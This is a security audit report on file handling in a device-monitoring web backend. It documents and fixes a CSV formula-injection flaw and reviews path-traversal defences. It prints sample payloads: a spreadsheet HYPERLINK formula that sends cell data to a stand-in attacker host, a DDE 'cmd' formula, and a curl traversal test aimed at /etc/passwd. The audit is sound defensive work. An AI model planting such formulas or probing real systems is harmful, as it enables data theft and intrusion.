# File Upload & File-Handling Security Review — CSPC-ICTU Monitoring System

**Date:** 2026-08-25
**Scope:** every file-write, file-serve and file-generation path in `backend/` — plus an
exhaustive check for upload capability
**Companions:** api-infra (A-02, the `/uploads` finding), database, authorization, auth-flow and
business-logic reviews of the same date
**Method:** dependency sweep, code sweep for multipart/upload handling, then a full audit of the
file-handling surface that *does* exist, verified by generating real output.

---

## 0. Verdict — File Handling: 7.5 / 10 → **9.5 / 10 after fixes**

> ### ⚠️ Scope finding: **this application has no file upload functionality.**
>
> Not "uploads are locked down" — there is no upload path at all, and this was verified four
> independent ways rather than assumed:
>
> ```
> dependencies      multer / formidable / busboy / express-fileupload / multiparty  → none installed
> code              multipart | req.file | req.files | FormData | enctype           → no handler
> middleware/       agentAuth.js  auth.js  securityHeaders.js                       → upload.js is gone
> static serving    express.static                                                   → none remaining
> ```
>
> The avatar-upload feature was deleted when login went Google-only, and its last artefact — the
> unauthenticated `/uploads` reader that was still serving 23 staff photos — was removed earlier
> today (api-infra **A-02**). Profile photos now come from Google as absolute URLs.
>
> **So items 1, 2, 3, 4, 7, 8, 9 and 10 of the checklist are Not Applicable by absence.** Marking
> them "Pass" would be misleading: there is no validation because there is nothing to validate.

That makes the useful question a different one: **what file handling does exist?** Three paths do,
and they were audited against the same principles:

| Path | What it does | Trust level |
|---|---|---|
| `reportService.build()` → `reportRenderer` | **Writes** CSV + PDF to `backend/reports/` | Content includes user-supplied text |
| `GET /api/reports/:id/download` | **Serves** those files via `res.download` | Authenticated |
| `backupService` | **Appends** NDJSON to `BACKUP_DIR`, reads them back for checksums | Server-generated only |

One real finding came out of it, and it is the file-handling vulnerability that actually applies
to a system like this:

| ID | Finding | Sev | CWE | Status |
|----|---------|-----|-----|--------|
| **FU-01** | **CSV formula injection** — agent-supplied hostnames and report titles reach live spreadsheet formulas | **Medium** | CWE-1236 | ✅ **Fixed** |
| **FU-02** | `hostname` is stored with no character validation at enrolment (FU-01's input path) | **Low** | CWE-20 | ⏳ Recommend — §3 |
| **FU-03** | No malware scanning on generated files | **Info** | — | ➖ N/A — §5 |

**Result: 309/309 backend tests pass (6 new). Verified by generating a real CSV from hostile input.**

---

## 1. FU-01 — CSV formula injection · **Medium** · CWE-1236 · ✅ fixed

**Evidence (before):** `backend/services/reportRenderer.js:43-46`

```js
function csvCell(v) {
  const s = v === null || v === undefined ? "" : String(v);
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
```

That is correct **RFC 4180 quoting** — it makes a cell *parse* correctly. It says nothing about
what a spreadsheet *does* with the parsed text.

**Why it matters.** Excel, LibreOffice Calc and Google Sheets execute any cell whose text begins
with `=`, `+`, `-`, `@`, TAB or CR. A cell reading

```
=HYPERLINK("http://attacker/?"&A1,"Open me")
```

is a live formula the moment someone opens the download — and it can read other cells and send
them somewhere. `=WEBSERVICE()` and DDE payloads (`=cmd|'/c calc'!A1`) are the same class.

**The text is reachable, and by a lower-privileged route than it first appears.** Two inputs land
in CSV cells:

1. **Report `title`** — straight from the `POST /api/reports` body (admin + it_staff).
2. **Device names** — `devices.device_name`, which `agentService.register:198` fills from
   `host.hostname` with **no character validation at all**:

```js
[host.ip_address || null, host.hostname || "unknown-server", host.location || "CSPC-ICTU Server Room"]
```

So a machine that enrols itself as `=cmd|'/c calc'!A1` plants a formula that fires **later, on an
ICTU staffer's PC**, when somebody exports a report. That is the classic stored/deferred shape —
and it lands in a file the feature exists to hand around.

**Exploitability.** Not remote-unauthenticated: enrolment needs a valid `AIK-` install key **and**
admin approval, and modern Excel warns before executing DDE. That is why this is Medium, not High.
But `=HYPERLINK` needs no DDE and no warning beyond a click, the fix is three lines, and reports
are explicitly designed to be downloaded and shared with ICTU.

**Reproduction:**

```
1. POST /api/reports  { "type":"alerts", "title":"=HYPERLINK(\"http://x/?\"&A1,\"Open\")", … }
2. GET  /api/reports/:id/download?format=csv
3. Open in Excel → cell B1 is a live hyperlink formula, not text
```

**Fix — shipped.** One choke point: every cell in the file goes through `csvCell`.

```js
const FORMULA_START = /^[=+\-@\t\r]/;

function csvCell(v) {
  const s = v === null || v === undefined ? "" : String(v);
  const guarded = FORMULA_START.test(s) && !Number.isFinite(Number(s)) ? `'${s}` : s;
  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}
```

**⚠️ The numeric exemption is the part that matters, and it is not an optimisation.** `-12.5`
starts with `-`. The naive fix — prefix anything matching `FORMULA_START` — would turn every
negative measurement into a **text** cell, and every `SUM` in the sheet would silently stop
including them. A monitoring report that quietly mis-totals is worse than one that is ugly.
`Number.isFinite(Number(s))` keeps numbers numeric while still catching a lone `-` and `=1+1`
(both `NaN`).

The guard is applied **before** the RFC 4180 quoting so the two compose: `=a,b` → `"'=a,b"`.

**Verified by generating a real report from hostile input:**

```
Title,"'=HYPERLINK(""http://attacker/?""&A1,""Open me"")"     ← neutralised
Device,Delta
'=cmd|'/c calc'!A1,-12.5                                       ← neutralised, and -12.5 intact
server-01,7                                                     ← ordinary text untouched
```

Six cases pinned in `tests/csvSafety.test.js`, including the negative-number exemption and the
quoting/guard composition.

**The PDF path is unaffected** — `pdfkit` draws text, there is no formula engine, and no template
is interpreted.

---

## 2. Filename handling & path traversal — pass, and the reason is structural

The checklist's items 3, 5 and 6 map onto the report files. All three pass, and the design reason
is worth stating: **the on-disk filename is never user-influenced.**

```js
const stem = `report-${id}`;                                    // reportService.js:938
fs.writeFileSync(path.join(REPORTS_DIR, `${stem}.csv`), …);
```

`id` is the `reports` table primary key. No traversal is possible at write time because there is
no user text in the path at all — which is stronger than sanitising one.

**Reads are defended twice over**, which is the right posture for the one path that resolves a
file from a database value (`reportService.fileFor`, :976-980):

```js
const fmt = String(format).toLowerCase();
if (fmt !== "csv" && fmt !== "pdf") return null;                // ① two-value allow-list
const absPath = path.join(REPORTS_DIR, `${path.basename(row.file_path)}.${fmt}`);   // ② basename
if (!absPath.startsWith(REPORTS_DIR) || !fs.existsSync(absPath)) return null;       // ③ prefix check
```

**The download *name* is separately sanitised** (:990) — and this is the one place user text does
reach a filename, in the `Content-Disposition` header:

```js
const safeTitle = String(row.title || "report").replace(/[^\w.-]+/g, "_").replace(/_+/g, "_").slice(0, 60);
```

An allow-list of `[A-Za-z0-9_.-]`, so CR/LF, quotes, `/`, `\` and `..` are all stripped — no header
injection and no traversal through the suggested filename. Length-capped at 60.

**Storage location (item 5):** `REPORTS_DIR = path.resolve(process.cwd(), "reports")` →
`backend/reports/`, and nginx serves `/opt/cspc/frontend-dist` (deployment-guide §5.2). Different
tree entirely; the report directory is **not** under any webroot and is reachable only through the
authenticated, audited route. `BACKUP_DIR` is a separate physical drive. Both are gitignored.

**Direct execution prevention (item 6):** nothing under `backend/` is served statically any more
(the last `express.static` went with A-02), Node does not execute files by path, and the files
written are `.csv`/`.pdf`. Reinforced today by `X-Content-Type-Options: nosniff` on every response
(api-infra A-01), so a browser cannot re-interpret a downloaded report as something executable.

---

## 3. FU-02 — `hostname` accepted without character validation · **Low** · CWE-20 · ⏳ recommend

`agentService.register` stores `host.hostname` verbatim as `devices.device_name`. That value then
appears in report cells (FU-01), device logs, alert messages, emails and the dashboard.

FU-01 is fixed at the **output** boundary, which is the correct primary defence — output encoding
belongs where the output format is known. But validating the **input** is cheap defence in depth,
and a hostname has a well-defined shape (RFC 1123):

```js
// agentService.register — before the INSERT
const HOSTNAME_OK = /^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$/;
const hostname = String(host.hostname ?? "").trim();
if (hostname && !HOSTNAME_OK.test(hostname)) {
  throw badRequest("hostname must be alphanumerics, dots, dashes or underscores (max 63).");
}
```

**Not applied here** because it changes enrolment behaviour: an existing agent whose hostname
contains something unexpected would start failing to register, and the agent's retry loop makes
that quiet. It belongs with a look at real hostnames in the field, not slipped into a security
pass. `display_name` (admin-set) should get the same treatment.

⚠️ **Unable to verify:** whether any currently-enrolled device has a hostname outside that
pattern. `SELECT device_id, device_name FROM devices WHERE device_name NOT REGEXP '^[A-Za-z0-9][A-Za-z0-9._-]*$';`
would settle it before enabling the check.

---

## 4. The write paths that are not uploads

**`backupService`** appends NDJSON to `BACKUP_DIR` and reads it back for SHA-256 checksums.
Filenames are `<stream>-<YYYY-MM-DD>.ndjson`, built from an internal stream name and the date —
no user input. Content is server-generated telemetry. Retention purges dated files older than
`BACKUP_RETENTION_DAYS`.

⚠️ One note carried from the database audit (DB-06): what lands in `BACKUP_DIR` is **not
encrypted**, and the `ops/db-backup` `mysqldump` lands there too, carrying `system_logs` PII on
removable media. That is a storage-security finding, not a file-handling one, and it is tracked
there.

**Outside the backend's web surface** (listed for completeness, not audited as web upload paths):
the Go agent writes its own `agent.conf`, and the ESP32 writes `/log.csv` to its micro SD. Neither
accepts a file from a network client; both write data they generated themselves.

---

## 5. Items that are N/A, with the reason

Marking these "Pass" would overstate the security posture — nothing is defending anything here,
because the attack surface does not exist.

| Item | Why N/A |
|---|---|
| **4 · Anti-virus scanning** | Nothing is uploaded. The only files written are CSV/PDF/NDJSON generated by this process from its own data — scanning your own output finds your own output |
| **9 · Image manipulation library CVEs** | No `sharp`, `jimp`, `gm` or ImageMagick binding is installed — verified in `package.json`. The one image-adjacent dependency is `pdfkit`, which *embeds* the letterhead PNGs shipped in the repo; it never decodes user-supplied images |
| **10 · ZIP bomb protection** | No archive library (`adm-zip`, `unzipper`, `yauzl`, `tar`) is installed and nothing decompresses anything. The only compression is `gzip -c` **writing** the mysqldump. ⚠️ If a restore procedure is ever scripted, it will decompress an archive and this item stops being N/A |
| **7 · MIME type validation** / **8 · Magic numbers** | Both are inbound-file checks. There is no inbound file. On the way *out*, `res.download` sets `Content-Disposition: attachment`, and `nosniff` (added today) stops a browser second-guessing the type |
| **1 · Type whitelist** / **2 · Size limits** | No upload. The nearest equivalents exist and pass: `express.json({ limit: "100kb" })`, a 60-sample batch cap, and `maxHttpBufferSize` on Socket.IO (api-infra A-07) |

---

## 6. Checklist diff

| # | Item | Verdict | Note |
|---|------|---------|------|
| 1 | File type validation (whitelist) | ➖ **N/A** | No upload path exists — §0. The download `format` **is** a two-value allow-list — §2 |
| 2 | File size limits | ➖ **N/A** | No upload. Request-body caps exist and are explicit (api-infra A-07) |
| 3 | Filename sanitization | ✅ **Pass** | On-disk name is `report-${id}` — no user input at all. `Content-Disposition` name is allow-listed to `[\w.-]`, capped at 60 — §2 |
| 4 | Anti-virus scanning | ➖ **N/A** | Nothing is uploaded — §5 |
| 5 | Storage outside webroot | ✅ **Pass** | `backend/reports/` and `BACKUP_DIR` are outside the nginx root; no `express.static` remains — §2 |
| 6 | Direct execution prevention | ✅ **Pass** | Nothing served statically; `.csv`/`.pdf` only; `nosniff` on every response — §2 |
| 7 | MIME type validation | ➖ **N/A** | Inbound check with no inbound file. Outbound sets `Content-Disposition: attachment` — §5 |
| 8 | Magic number verification | ➖ **N/A** | Same — §5 |
| 9 | Image library vulnerabilities | ➖ **N/A** | No image-processing library installed; `pdfkit` embeds repo-shipped assets only — §5 |
| 10 | ZIP bomb protection | ➖ **N/A** | No archive library; nothing decompresses. ⚠️ Revisit if a restore script is written — §5 |
| — | **CSV formula injection** *(not on the list; found anyway)* | ✅ **Pass** *(was Fail)* | The one file-handling vulnerability that actually applied here → FU-01 |
| — | Path traversal on file read | ✅ **Pass** | `path.basename` + `startsWith(REPORTS_DIR)` + format allow-list — §2 |
| — | Header injection via filename | ✅ **Pass** | `safeTitle` strips CR/LF and quotes — §2 |

---

## 7. Risk score and priority

**Before: 7.5 / 10. After: 9.5 / 10.**

The score is high because most of the attack surface **does not exist** — and the biggest
improvement to it was made earlier today by deleting the last remnant of the upload feature
(api-infra A-02). The remaining half-point is FU-02, an input-validation nicety behind an
already-fixed output boundary.

| # | Action | Owner | Effort |
|---|--------|-------|--------|
| 1 | ✅ **Neutralise CSV formulas** — verified against a real generated report | shipped | — |
| 2 | 🔲 **Validate `hostname` at enrolment** (§3) — check the existing rows first | you | 15 min |
| 3 | 🔲 **Keep it this way.** If an upload feature is ever added, items 1–10 all activate at once — §8 | future | — |
| 4 | 🔲 Encrypt `BACKUP_DIR` (carried from database DB-06 — not a file-handling fix, but it is the files) | you | 30 min |

### Quick tests

```bash
cd backend && npm test          # 309/309, incl. tests/csvSafety.test.js

# FU-01 · a hostile title must come back neutralised, and numbers must stay numeric
node --input-type=module -e "import('./services/reportRenderer.js').then(({toCSV})=>{
  console.log(toCSV({ title:'=1+1', type:'alerts',
    periodStart:new Date(), periodEnd:new Date(), generatedAt:new Date(), summary:[],
    table:{ columns:['a','b'], rows:[['=cmd|x', -12.5]] } }));
});"
# expect:  Title,'=1+1        and        '=cmd|x,-12.5      ← guarded / numeric intact

# Path traversal on the download route must not resolve outside REPORTS_DIR
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer <valid>" \
  "http://127.0.0.1:3000/api/reports/1/download?format=../../../etc/passwd"   # 404 (allow-list)
```

---

## 8. If an upload feature is ever added

Every N/A above becomes live the day a single `multer` route appears. The shape that fits this
codebase:

```js
// 1. Memory storage — never write before validating
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 2 * 1024 * 1024, files: 1 },        // item 2
});

// 2. Whitelist by MAGIC NUMBER, not by extension or client-sent MIME (items 1, 7, 8)
const MAGIC = { "image/png": [0x89, 0x50, 0x4e, 0x47], "image/jpeg": [0xff, 0xd8, 0xff] };
const sniff = (buf) =>
  Object.entries(MAGIC).find(([, sig]) => sig.every((b, i) => buf[i] === b))?.[0] ?? null;

// 3. Server-generated filename — never the client's (item 3)
const name = `${crypto.randomUUID()}.${ext}`;

// 4. Outside the webroot, served only through an authenticated route (items 5, 6)
```

And the rules this audit would apply to it: reject on magic-number mismatch rather than trusting
`file.mimetype` (client-controlled); never reflect the original filename into a path *or* a header
without an allow-list; and if the files are images shown to users, remember that
`Content-Type: image/svg+xml` is a script-execution vector — which is another reason the CSP added
today (`default-src 'none'`) matters.

---

## 9. What was verified, and what was not

**Verified:** the absence of upload capability, four independent ways (dependencies, code sweep,
`middleware/` listing, static-serving sweep); the CSV guard by generating a real report from
hostile input and confirming both neutralisation *and* that `-12.5` stayed numeric; the report
filename is `report-${id}` with no user input; the read path's three-layer defence; `safeTitle`'s
allow-list. 309/309 tests pass.

**Unable to verify — stated rather than assumed:**

- **Whether existing devices have hostnames outside the RFC 1123 pattern** — the `SELECT … NOT REGEXP`
  in §3 would settle it, and should be run before enabling any input validation.
- **Behaviour in a real spreadsheet.** The neutralisation is the standard apostrophe prefix and the
  output was inspected, but the CSV was not opened in Excel or LibreOffice to confirm the formula
  is inert and the quote is hidden. That needs a desktop spreadsheet.
- **`pdfkit`'s own parsing of the letterhead PNGs** was not audited. They are repo-shipped assets,
  not user input, so the exposure is limited to a malicious commit — but `pdfkit` does decode them.
